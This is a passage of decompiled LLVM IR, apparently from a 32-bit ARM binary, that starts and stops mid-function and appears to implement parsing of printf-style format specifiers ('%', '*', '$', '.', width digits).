  store i32 0, i32* %r0.global-to-local, align 4
  %v2_155a4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_15598

dec_label_pc_15598:                               ; preds = %dec_label_pc_155c8.dec_label_pc_15598_crit_edge, %dec_label_pc_15594
  %v1_155a8 = phi i32 [ %v1_155b8, %dec_label_pc_155c8.dec_label_pc_15598_crit_edge ], [ 0, %dec_label_pc_15594 ]
  %v0_15598 = phi i32 [ %v0_15598.pre, %dec_label_pc_155c8.dec_label_pc_15598_crit_edge ], [ %v0_15558, %dec_label_pc_15594 ]
  %v1_15598 = inttoptr i32 %v0_15598 to i32*
  %v2_15598 = load i32, i32* %v1_15598, align 4
  %v4_1559c = mul i32 %v1_155a8, 4
  %v5_1559c = add i32 %v2_15598, %v4_1559c
  store i32 %v5_1559c, i32* %r3.global-to-local, align 4
  %v1_155a0 = add i32 %v5_1559c, -4
  %v2_155a0 = inttoptr i32 %v1_155a0 to i8*
  %v3_155a0 = load i8, i8* %v2_155a0, align 1
  %v4_155a0 = zext i8 %v3_155a0 to i32
  store i32 %v4_155a0, i32* %r1.global-to-local, align 4
  store i32 %v2_155a4, i32* @ip, align 4
  %v2_155a8 = add i32 %v1_155a8, %v2_155a4
  store i32 %v2_155a8, i32* %r2.global-to-local, align 4
  %v3_155ac = add i32 %v2_155a8, -72
  %v4_155ac = inttoptr i32 %v3_155ac to i8*
  store i8 %v3_155a0, i8* %v4_155ac, align 1
  %v0_155b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_155b0 = add i32 %v0_155b0, -4
  %v2_155b0 = inttoptr i32 %v1_155b0 to i32*
  %v3_155b0 = load i32, i32* %v2_155b0, align 4
  store i32 %v3_155b0, i32* %r3.global-to-local, align 4
  %v0_155b4 = load i32, i32* %r1.global-to-local, align 4
  %v9_155b4 = icmp eq i32 %v0_155b4, %v3_155b0
  %v0_155b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_155b8 = add i32 %v0_155b8, 1
  store i32 %v1_155b8, i32* %r0.global-to-local, align 4
  br i1 %v9_155b4, label %dec_label_pc_155c0, label %dec_label_pc_15a84

dec_label_pc_155c0:                               ; preds = %dec_label_pc_15598
  %v2_155c0 = icmp eq i32 %v3_155b0, 0
  br i1 %v2_155c0, label %dec_label_pc_155d0, label %dec_label_pc_155c8

dec_label_pc_155c8:                               ; preds = %dec_label_pc_155c0
  %tmp182 = icmp ult i32 %v1_155b8, 32
  br i1 %tmp182, label %dec_label_pc_155c8.dec_label_pc_15598_crit_edge, label %dec_label_pc_155d0

dec_label_pc_155c8.dec_label_pc_15598_crit_edge:  ; preds = %dec_label_pc_155c8
  %v0_15598.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15598

dec_label_pc_155d0:                               ; preds = %dec_label_pc_155c8, %dec_label_pc_155c0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_155d8 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_155d8, i32* %r0.global-to-local, align 4
  %v0_155e8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_155dc

dec_label_pc_155dc:                               ; preds = %.dec_label_pc_155dc_crit_edge, %dec_label_pc_155d0
  %v3_15610.pre-phi = phi i32 [ %.pre, %.dec_label_pc_155dc_crit_edge ], [ %v2_155a4, %dec_label_pc_155d0 ]
  %v0_1560864 = phi i32 [ %v3_1558c, %.dec_label_pc_155dc_crit_edge ], [ %v2_155d8, %dec_label_pc_155d0 ]
  %v0_155e8 = phi i32 [ ptrtoint (i32* @global_var_32024.1324 to i32), %.dec_label_pc_155dc_crit_edge ], [ %v0_155e8.pre, %dec_label_pc_155d0 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 636, i32* %r2.global-to-local, align 4
  %v2_155e8 = add i32 %v0_155e8, -38808
  store i32 %v2_155e8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_155fc = inttoptr i32 %v2_155e8 to i8*
  store i8* %v4_155fc, i8** %stack_var_-120, align 4
  br label %dec_label_pc_15608

dec_label_pc_15604:                               ; preds = %.thread20, %dec_label_pc_15738
  %v0_15604 = phi i32 [ %v2_157b0, %.thread20 ], [ %v0_1571476, %dec_label_pc_15738 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_15738 ]
  store i32 %v0_15604, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %dec_label_pc_155dc, %dec_label_pc_15604
  %v1_1561c = phi i32 [ %v0_1560864, %dec_label_pc_155dc ], [ %v0_15604, %dec_label_pc_15604 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_155dc ], [ %stack_var_-44.0, %dec_label_pc_15604 ]
  %v1_15608 = inttoptr i32 %v1_1561c to i8*
  %v2_15608 = load i8, i8* %v1_15608, align 1
  %v3_15608 = zext i8 %v2_15608 to i32
  store i32 %v3_15608, i32* %r3.global-to-local, align 4
  %v7_1560c = icmp eq i8 %v2_15608, 42
  br i1 %v7_1560c, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15608
  store i32 %v1_1561c, i32* %r6.global-to-local, align 4
  %v0_15620 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15620, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15668.preheader

bb:                                               ; preds = %dec_label_pc_15608
  %v1_15614 = load i32, i32* %r8.global-to-local, align 4
  %v2_15614 = load i32, i32* %sb.global-to-local, align 4
  %v4_15614 = mul i32 %v2_15614, %v1_15614
  %v5_15614 = add i32 %v4_15614, %v3_15610.pre-phi
  store i32 %v5_15614, i32* %r3.global-to-local, align 4
  %v2_1561c = add i32 %v1_1561c, 1
  store i32 %v2_1561c, i32* %r6.global-to-local, align 4
  %v0_15620111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15620111, i32* %r1.global-to-local, align 4
  %v3_15624 = add i32 %v5_15614, -40
  %v4_15624 = inttoptr i32 %v3_15624 to i32*
  store i32 %v0_15620111, i32* %v4_15624, align 4
  %v0_1566c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15668.preheader

dec_label_pc_15668.preheader:                     ; preds = %.thread8, %bb
  %v0_1566c.pre = phi i32 [ %v1_1561c, %.thread8 ], [ %v0_1566c.pre.pre, %bb ]
  %v0_15670.pre = load i32, i32* @lr, align 4
  %v2_15670 = add i32 %v0_15670.pre, 636
  %v3_15670 = inttoptr i32 %v2_15670 to i32*
  br label %dec_label_pc_15668

dec_label_pc_1562c:                               ; preds = %dec_label_pc_15668
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_15630 = load i32, i32* %r1.global-to-local, align 4
  %v2_15630 = add i32 %v0_15630, -214748363
  %tmp139 = sub i32 214748362, %v0_15630
  %v6_15630 = and i32 %tmp139, %v0_15630
  %v7_15630 = icmp slt i32 %v6_15630, 0
  %v8_15630 = icmp slt i32 %v2_15630, 0
  %v9_15630 = icmp eq i32 %v0_15630, 214748363
  %v3_15634 = xor i1 %v8_15630, %v7_15630
  %v4_15634 = or i1 %v9_15630, %v3_15634
  br i1 %v4_15634, label %dec_label_pc_1564c, label %dec_label_pc_15638

dec_label_pc_15638:                               ; preds = %dec_label_pc_1562c
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_1563c = icmp eq i32 %v0_15630, 214748364
  br i1 %v9_1563c, label %dec_label_pc_15644, label %dec_label_pc_15664

dec_label_pc_15644:                               ; preds = %dec_label_pc_15638
  %v8_15648 = icmp ugt i8 %v2_1566c, 55
  br i1 %v8_15648, label %dec_label_pc_15664, label %dec_label_pc_1564c

dec_label_pc_1564c:                               ; preds = %dec_label_pc_15644, %dec_label_pc_1562c
  %v2_15650 = mul i32 %v0_15630, 10
  %v1_15654 = add i32 %v2_15650, -48
  store i32 %v1_15654, i32* %r3.global-to-local, align 4
  %v2_15658 = add i32 %v1_15654, %v3_1566c
  br label %dec_label_pc_15664

dec_label_pc_15664:                               ; preds = %dec_label_pc_15644, %dec_label_pc_15638, %dec_label_pc_1564c
  %storemerge = phi i32 [ %v2_15658, %dec_label_pc_1564c ], [ 2147483647, %dec_label_pc_15638 ], [ 2147483647, %dec_label_pc_15644 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_15664 = add i32 %v0_156ec, 1
  store i32 %v1_15664, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15668

dec_label_pc_15668:                               ; preds = %dec_label_pc_15668.preheader, %dec_label_pc_15664
  %v0_156ec = phi i32 [ %v0_1566c.pre, %dec_label_pc_15668.preheader ], [ %v1_15664, %dec_label_pc_15664 ]
  store i32 636, i32* %r2.global-to-local, align 4
  %v1_1566c = inttoptr i32 %v0_156ec to i8*
  %v2_1566c = load i8, i8* %v1_1566c, align 1
  %v3_1566c = zext i8 %v2_1566c to i32
  store i32 %v3_1566c, i32* @ip, align 4
  %v4_15670 = load i32, i32* %v3_15670, align 4
  store i32 %v4_15670, i32* %r3.global-to-local, align 4
  %v2_15674 = mul nuw nsw i32 %v3_1566c, 2
  store i32 %v2_15674, i32* %r2.global-to-local, align 4
  %v2_15678 = add i32 %v2_15674, %v4_15670
  %v3_15678 = inttoptr i32 %v2_15678 to i16*
  %v4_15678 = load i16, i16* %v3_15678, align 2
  %v6_15678 = zext i16 %v4_15678 to i32
  store i32 %v6_15678, i32* %r3.global-to-local, align 4
  %v1_1567c = and i32 %v6_15678, 8
  %v2_1567c = icmp eq i32 %v1_1567c, 0
  br i1 %v2_1567c, label %dec_label_pc_15684, label %dec_label_pc_1562c

dec_label_pc_15684:                               ; preds = %dec_label_pc_15668
  %v0_15684 = load i32, i32* %r0.global-to-local, align 4
  %v1_15684 = add i32 %v0_15684, -1
  %v2_15684 = inttoptr i32 %v1_15684 to i8*
  %v3_15684 = load i8, i8* %v2_15684, align 1
  %v4_15684 = zext i8 %v3_15684 to i32
  store i32 %v4_15684, i32* %r3.global-to-local, align 4
  %v7_15688 = icmp eq i8 %v3_15684, 37
  br i1 %v7_15688, label %dec_label_pc_15690, label %dec_label_pc_15750

dec_label_pc_15690:                               ; preds = %dec_label_pc_15684
  %v7_15690 = icmp eq i8 %v2_1566c, 36
  %. = zext i1 %v7_15690 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_1569c = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_1569c, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_15690
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_15690, %bb144
  %v0_156a4 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_15690 ]
  %v2_156a4 = icmp eq i32 %v0_156a4, 0
  %v0_156d8 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_156a4, label %dec_label_pc_156d8, label %dec_label_pc_156ac

dec_label_pc_156ac:                               ; preds = %thread-pre-split
  %v2_156d8 = icmp eq i32 %v0_156d8, 0
  %v1_156b0 = add i32 %v0_156ec, 1
  store i32 %v1_156b0, i32* %r0.global-to-local, align 4
  br i1 %v2_156d8, label %dec_label_pc_15a84, label %dec_label_pc_156b8

dec_label_pc_156b8:                               ; preds = %dec_label_pc_156ac
  %v2_156b8 = sub i32 %v0_1569c, %v0_156d8
  %v4_156b8 = xor i32 %v0_156d8, %v0_1569c
  %v5_156b8 = xor i32 %v2_156b8, %v0_1569c
  %v6_156b8 = and i32 %v5_156b8, %v4_156b8
  %v7_156b8 = icmp slt i32 %v6_156b8, 0
  %v8_156b8 = icmp slt i32 %v2_156b8, 0
  %v9_156b8 = icmp eq i32 %v0_1569c, %v0_156d8
  %v3_156bc = xor i1 %v8_156b8, %v7_156b8
  %v4_156bc = or i1 %v9_156b8, %v3_156bc
  br i1 %v4_156bc, label %dec_label_pc_156cc, label %bb145

bb145:                                            ; preds = %dec_label_pc_156b8
  store i32 %v0_1569c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_156cc

dec_label_pc_156c8:                               ; preds = %dec_label_pc_156ec, %dec_label_pc_156f4
  %v0_156c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_156c8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_156cc

dec_label_pc_156cc:                               ; preds = %bb145, %dec_label_pc_156b8, %dec_label_pc_156c8
  %v0_156cc = phi i32 [ %v0_15684, %dec_label_pc_156c8 ], [ %v1_156b0, %dec_label_pc_156b8 ], [ %v1_156b0, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_156c8 ], [ %v0_1569c, %dec_label_pc_156b8 ], [ %v0_1569c, %bb145 ]
  store i32 %v0_156cc, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_15708.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_15708 = ptrtoint i8* %v2_15708.pre to i32
  br label %dec_label_pc_15708

dec_label_pc_156d8:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_156d8, 1
  br i1 %tmp146, label %dec_label_pc_156ec, label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %dec_label_pc_156d8
  %v7_156e0 = icmp eq i8 %v2_1566c, 109
  br i1 %v7_156e0, label %dec_label_pc_15750, label %dec_label_pc_15a84

dec_label_pc_156ec:                               ; preds = %dec_label_pc_156d8
  %tmp183 = icmp ugt i32 %v0_156ec, %v0_15684
  br i1 %tmp183, label %dec_label_pc_156f4, label %dec_label_pc_156c8

dec_label_pc_156f4:                               ; preds = %dec_label_pc_156ec
  %v1_156f4 = inttoptr i32 %v0_15684 to i8*
  %v2_156f4 = load i8, i8* %v1_156f4, align 1
  %v3_156f4 = zext i8 %v2_156f4 to i32
  store i32 %v3_156f4, i32* %r3.global-to-local, align 4
  %v7_156f8 = icmp eq i8 %v2_156f4, 48
  br i1 %v7_156f8, label %dec_label_pc_156c8, label %bb147

bb147:                                            ; preds = %dec_label_pc_156f4
  %v1_156fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_156fc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15750

dec_label_pc_15708.loopexit:                      ; preds = %dec_label_pc_15710
  %v1_1571c = load i32, i32* @r4, align 4
  %v3_1571c = or i32 %v1_1571c, %v0_15730
  store i32 %v3_1571c, i32* @r4, align 4
  %v2_15720 = add i32 %v0_1571476, 1
  store i32 %v2_15720, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15708

dec_label_pc_15708:                               ; preds = %dec_label_pc_15708.loopexit, %dec_label_pc_156cc
  %v0_1571476 = phi i32 [ %v2_15720, %dec_label_pc_15708.loopexit ], [ %v0_156cc, %dec_label_pc_156cc ]
  store i32 %v3_15708, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15714 = inttoptr i32 %v0_1571476 to i8*
  br label %dec_label_pc_15710

dec_label_pc_15710:                               ; preds = %dec_label_pc_15728, %dec_label_pc_15708
  %v0_15730 = phi i32 [ %v2_15730, %dec_label_pc_15728 ], [ 1, %dec_label_pc_15708 ]
  %v0_15710 = phi i32 [ %v5_15710, %dec_label_pc_15728 ], [ %v3_15708, %dec_label_pc_15708 ]
  %v1_15710 = inttoptr i32 %v0_15710 to i8*
  %v2_15710 = load i8, i8* %v1_15710, align 1
  %v3_15710 = zext i8 %v2_15710 to i32
  store i32 %v3_15710, i32* %r2.global-to-local, align 4
  %v5_15710 = add i32 %v0_15710, 1
  store i32 %v5_15710, i32* %r0.global-to-local, align 4
  %v2_15714 = load i8, i8* %v1_15714, align 1
  %v3_15714 = zext i8 %v2_15714 to i32
  store i32 %v3_15714, i32* %r3.global-to-local, align 4
  %v9_15718 = icmp eq i8 %v2_15714, %v2_15710
  br i1 %v9_15718, label %dec_label_pc_15708.loopexit, label %dec_label_pc_15728

dec_label_pc_15728:                               ; preds = %dec_label_pc_15710
  %v1_15728 = inttoptr i32 %v5_15710 to i8*
  %v2_15728 = load i8, i8* %v1_15728, align 1
  %v3_15728 = zext i8 %v2_15728 to i32
  store i32 %v3_15728, i32* %r3.global-to-local, align 4
  %v2_1572c = icmp eq i8 %v2_15728, 0
  %v2_15730 = mul i32 %v0_15730, 2
  store i32 %v2_15730, i32* %r1.global-to-local, align 4
  br i1 %v2_1572c, label %dec_label_pc_15738, label %dec_label_pc_15710

dec_label_pc_15738:                               ; preds = %dec_label_pc_15728
  %v1_15738 = add i32 %v0_1571476, -1
  %v2_15738 = inttoptr i32 %v1_15738 to i8*
  %v3_15738 = load i8, i8* %v2_15738, align 1
  %v7_1573c = icmp eq i8 %v3_15738, 37
  %v0_15740 = load i32, i32* @r4, align 4
  %v1_15740 = and i32 %v0_15740, 10
  store i32 %v1_15740, i32* %r3.global-to-local, align 4
  %v4_15744 = udiv i32 %v1_15740, 2
  %v5_15744 = sub nuw nsw i32 -1, %v4_15744
  %v6_15744 = and i32 %v0_15740, %v5_15744
  store i32 %v6_15744, i32* @r4, align 4
  br i1 %v7_1573c, label %dec_label_pc_1574c, label %dec_label_pc_15604

dec_label_pc_1574c:                               ; preds = %dec_label_pc_15738
  %v0_1574c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1574c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %bb147, %dec_label_pc_15684, %dec_label_pc_156e0, %dec_label_pc_1574c
  %v1_15790 = phi i32 [ %v0_1571476, %dec_label_pc_1574c ], [ %v0_156ec, %bb147 ], [ %v0_156ec, %dec_label_pc_156e0 ], [ %v0_156ec, %dec_label_pc_15684 ]
  %v0_1578c = phi i32 [ %v5_15710, %dec_label_pc_1574c ], [ %v0_15684, %bb147 ], [ %v0_15684, %dec_label_pc_156e0 ], [ %v0_15684, %dec_label_pc_15684 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_1574c ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_156e0 ], [ %stack_var_-44.1, %dec_label_pc_15684 ]
  %v1_15750 = inttoptr i32 %v0_1578c to i8*
  %v2_15750 = load i8, i8* %v1_15750, align 1
  %v3_15750 = zext i8 %v2_15750 to i32
  store i32 %v3_15750, i32* %r3.global-to-local, align 4
  %v7_15754 = icmp eq i8 %v2_15750, 42
  br i1 %v7_15754, label %dec_label_pc_1575c, label %dec_label_pc_1579c

dec_label_pc_1575c:                               ; preds = %dec_label_pc_15750
  %v0_1575c = load i32, i32* %fp.global-to-local, align 4
  %v2_1575c = icmp eq i32 %v0_1575c, 0
  br i1 %v2_1575c, label %dec_label_pc_1578c, label %dec_label_pc_15764

dec_label_pc_15764:                               ; preds = %dec_label_pc_1575c
  %v1_15764 = inttoptr i32 %v1_15790 to i8*
  %v2_15764 = load i8, i8* %v1_15764, align 1
  %v3_15764 = zext i8 %v2_15764 to i32
  store i32 %v3_15764, i32* %r3.global-to-local, align 4
  %v7_15768 = icmp eq i8 %v2_15764, 36
  br i1 %v7_15768, label %dec_label_pc_15770, label %dec_label_pc_15a84

dec_label_pc_15770:                               ; preds = %dec_label_pc_15764
  %v0_15770 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_15770, 1
  br i1 %tmp148, label %dec_label_pc_15a84, label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %dec_label_pc_15770
  %v0_1577c = load i32, i32* %r8.global-to-local, align 4
  %v1_1577c = load i32, i32* %sb.global-to-local, align 4
  %v3_1577c = mul i32 %v1_1577c, %v0_1577c
  %v4_1577c = add i32 %v3_1577c, %v3_15610.pre-phi
  store i32 %v4_1577c, i32* %r3.global-to-local, align 4
  %v1_15780 = add i32 %v1_15790, 1
  store i32 %v1_15780, i32* %r6.global-to-local, align 4
  %v2_15784 = add i32 %v4_1577c, -12
  %v3_15784 = inttoptr i32 %v2_15784 to i32*
  store i32 %v0_15770, i32* %v3_15784, align 4
  br label %dec_label_pc_15798

dec_label_pc_1578c:                               ; preds = %dec_label_pc_1575c
  %v1_1578c = add i32 %v0_1578c, 1
  store i32 %v1_1578c, i32* %r3.global-to-local, align 4
  %v9_15790 = icmp eq i32 %v1_1578c, %v1_15790
  br i1 %v9_15790, label %dec_label_pc_15798, label %dec_label_pc_15a84

dec_label_pc_15798:                               ; preds = %dec_label_pc_1578c, %dec_label_pc_15778
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1579c

dec_label_pc_1579c:                               ; preds = %dec_label_pc_15750, %dec_label_pc_15798
  %v0_1579c = load i32, i32* %r8.global-to-local, align 4
  %v2_1579c = icmp eq i32 %v0_1579c, 0
  br i1 %v2_1579c, label %dec_label_pc_157a8, label %dec_label_pc_157c8.loopexit

dec_label_pc_157a8:                               ; preds = %dec_label_pc_1579c
  %v0_157a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_157a8 = inttoptr i32 %v0_157a8 to i8*
  %v2_157a8 = load i8, i8* %v1_157a8, align 1
  %v3_157a8 = zext i8 %v2_157a8 to i32
  store i32 %v3_157a8, i32* %r3.global-to-local, align 4
  %v7_157ac = icmp eq i8 %v2_157a8, 46
  br i1 %v7_157ac, label %.thread20, label %dec_label_pc_157c0

.thread20:                                        ; preds = %dec_label_pc_157a8
  %v2_157b0 = add i32 %v0_157a8, 1
  store i32 %v2_157b0, i32* %r6.global-to-local, align 4
  %v1_157b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_157b4, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15604

dec_label_pc_157c0:                               ; preds = %dec_label_pc_157a8
  %v0_157c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_157c0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_157c8

dec_label_pc_157c8.loopexit:                      ; preds = %dec_label_pc_1579c
  %v1_157a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_157a0, i32* @r5, align 4
  %v0_157d4.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157c8

dec_label_pc_157c8:                               ; preds = %dec_label_pc_157c8.loopexit, %dec_label_pc_157c0
  %v0_157d4.pre = phi i32 [ %v0_157d4.pre.pre, %dec_label_pc_157c8.loopexit ], [ %v0_157a8, %dec_label_pc_157c0 ]
  store i32 -38932, i32* %r3.global-to-local, align 4
  %v0_157cc = load i32, i32* @lr, align 4
  %v2_157cc = add i32 %v0_157cc, -38932
  store i32 %v2_157cc, i32* %r1.global-to-local, align 4
  %v1_157d4 = inttoptr i32 %v0_157d4.pre to i8*
  br label %dec_label_pc_157d0

dec_label_pc_157d0:                               ; preds = %dec_label_pc_157e4, %dec_label_pc_157c8
  %v0_157e4 = phi i32 [ %v1_157e4, %dec_label_pc_157e4 ], [ %v2_157cc, %dec_label_pc_157c8 ]
  %v1_157d0 = inttoptr i32 %v0_157e4 to i8*
  %v2_157d0 = load i8, i8* %v1_157d0, align 1
  %v3_157d0 = zext i8 %v2_157d0 to i32
  store i32 %v3_157d0, i32* %r2.global-to-local, align 4
  %v2_157d4 = load i8, i8* %v1_157d4, align 1
  %v3_157d4 = zext i8 %v2_157d4 to i32
  store i32 %v3_157d4, i32* %r3.global-to-local, align 4
  %v9_157d8 = icmp eq i8 %v2_157d4, %v2_157d0
  br i1 %v9_157d8, label %bb149, label %dec_label_pc_157e4

bb149:                                            ; preds = %dec_label_pc_157d0
  %v2_157dc = add i32 %v0_157d4.pre, 1
  store i32 %v2_157dc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157e4:                               ; preds = %dec_label_pc_157d0
  %v1_157e4 = add i32 %v0_157e4, 1
  %v2_157e4 = inttoptr i32 %v1_157e4 to i8*
  %v3_157e4 = load i8, i8* %v2_157e4, align 1
  %v4_157e4 = zext i8 %v3_157e4 to i32
  store i32 %v4_157e4, i32* %r3.global-to-local, align 4
  store i32 %v1_157e4, i32* %r1.global-to-local, align 4
  %v2_157e8 = icmp eq i8 %v3_157e4, 0
  br i1 %v2_157e8, label %dec_label_pc_157f0, label %dec_label_pc_157d0

dec_label_pc_157f0:                               ; preds = %dec_label_pc_157e4, %bb149
  %v1_15814 = phi i32 [ %v2_157dc, %bb149 ], [ %v0_157d4.pre, %dec_label_pc_157e4 ]
  %v1_15810 = phi i32 [ %v0_157e4, %bb149 ], [ %v1_157e4, %dec_label_pc_157e4 ]
  %v2_157f8 = sub i32 %v1_15810, %v2_157cc
  store i32 %v2_157f8, i32* %r3.global-to-local, align 4
  %v8_15800 = icmp sgt i32 %v2_157f8, 1
  br i1 %v8_15800, label %.thread24, label %dec_label_pc_15804

dec_label_pc_15804:                               ; preds = %dec_label_pc_157f0
  %v1_15804 = inttoptr i32 %v1_15814 to i8*
  %v2_15804 = load i8, i8* %v1_15804, align 1
  %v3_15804 = zext i8 %v2_15804 to i32
  store i32 %v3_15804, i32* %r2.global-to-local, align 4
  %v1_15808 = inttoptr i32 %v1_15810 to i8*
  %v2_15808 = load i8, i8* %v1_15808, align 1
  %v3_15808 = zext i8 %v2_15808 to i32
  store i32 %v3_15808, i32* %r3.global-to-local, align 4
  %v9_1580c = icmp eq i8 %v2_15804, %v2_15808
  br i1 %v9_1580c, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_15804
  %v2_15810 = add i32 %v1_15810, 9
  store i32 %v2_15810, i32* %r1.global-to-local, align 4
  %v2_15814 = add i32 %v1_15814, 1
  store i32 %v2_15814, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_15804, %dec_label_pc_157f0, %bb150
  %v0_1581c = phi i32 [ %v1_15810, %dec_label_pc_15804 ], [ %v1_15810, %dec_label_pc_157f0 ], [ %v2_15810, %bb150 ]
  %v0_15818 = phi i32 [ %v1_15814, %dec_label_pc_15804 ], [ %v1_15814, %dec_label_pc_157f0 ], [ %v2_15814, %bb150 ]
  %v1_15818 = inttoptr i32 %v0_15818 to i8*
  %v2_15818 = load i8, i8* %v1_15818, align 1
  %v3_15818 = zext i8 %v2_15818 to i32
  store i32 %v3_15818, i32* %r2.global-to-local, align 4
  %v1_1581c = add i32 %v0_1581c, 9
  %v2_1581c = inttoptr i32 %v1_1581c to i8*
  %v3_1581c = load i8, i8* %v2_1581c, align 1
  %v4_1581c = zext i8 %v3_1581c to i32
  store i32 %v4_1581c, i32* %r3.global-to-local, align 4
  %v2_15820 = icmp eq i8 %v2_15818, 0
  %v3_15824 = mul nuw nsw i32 %v4_1581c, 256
  store i32 %v3_15824, i32* @ip, align 4
  br i1 %v2_15820, label %dec_label_pc_15a84, label %dec_label_pc_1582c

dec_label_pc_1582c:                               ; preds = %.thread24
  store i32 -38832, i32* %r3.global-to-local, align 4
  %v2_15830 = add i32 %v0_157cc, -38832
  store i32 %v2_15830, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %dec_label_pc_158b8, %dec_label_pc_1582c
  %v1_15848 = phi i32 [ %v1_158b8, %dec_label_pc_158b8 ], [ %v2_15830, %dec_label_pc_1582c ]
  %v1_15834 = inttoptr i32 %v1_15848 to i8*
  %v2_15834 = load i8, i8* %v1_15834, align 1
  %v3_15834 = zext i8 %v2_15834 to i32
  store i32 %v3_15834, i32* %r3.global-to-local, align 4
  %v9_15838 = icmp eq i8 %v2_15834, %v2_15818
  br i1 %v9_15838, label %dec_label_pc_15840, label %dec_label_pc_158b8

dec_label_pc_15840:                               ; preds = %dec_label_pc_15834
  store i32 %v2_15830, i32* %r3.global-to-local, align 4
  %v2_15848 = sub i32 %v1_15848, %v2_15830
  store i32 %v2_15848, i32* %r1.global-to-local, align 4
  %v7_15850 = icmp slt i32 %v2_15848, 18
  br i1 %v7_15850, label %bb152, label %dec_label_pc_15854

dec_label_pc_15854:                               ; preds = %dec_label_pc_15840
  %v1_15854 = and i32 %v3_15824, 1024
  %v2_15854 = icmp eq i32 %v1_15854, 0
  br i1 %v2_15854, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_15854
  %v2_15858 = add i32 %v2_15848, -2
  store i32 %v2_15858, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_15840, %dec_label_pc_15854, %bb151
  %v0_15860 = phi i32 [ %v2_15848, %dec_label_pc_15840 ], [ %v2_15848, %dec_label_pc_15854 ], [ %v2_15858, %bb151 ]
  store i32 -38880, i32* %r3.global-to-local, align 4
  %v1_15860 = load i32, i32* %r7.global-to-local, align 4
  %v2_15860 = add i32 %v1_15860, 32
  %v3_15860 = inttoptr i32 %v2_15860 to i32*
  store i32 %v0_15860, i32* %v3_15860, align 4
  %v0_15864 = load i32, i32* @lr, align 4
  %v1_15864 = load i32, i32* %r3.global-to-local, align 4
  %v2_15864 = add i32 %v1_15864, %v0_15864
  store i32 %v2_15864, i32* %r3.global-to-local, align 4
  %v1_15868 = add i32 %v2_15864, -1
  store i32 %v1_15868, i32* %r0.global-to-local, align 4
  %v0_15870.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1586c

dec_label_pc_1586c:                               ; preds = %dec_label_pc_1586c, %bb152
  %v0_1586c = phi i32 [ %v1_1586c, %dec_label_pc_1586c ], [ %v1_15868, %bb152 ]
  %v1_1586c = add i32 %v0_1586c, 1
  %v2_1586c = inttoptr i32 %v1_1586c to i8*
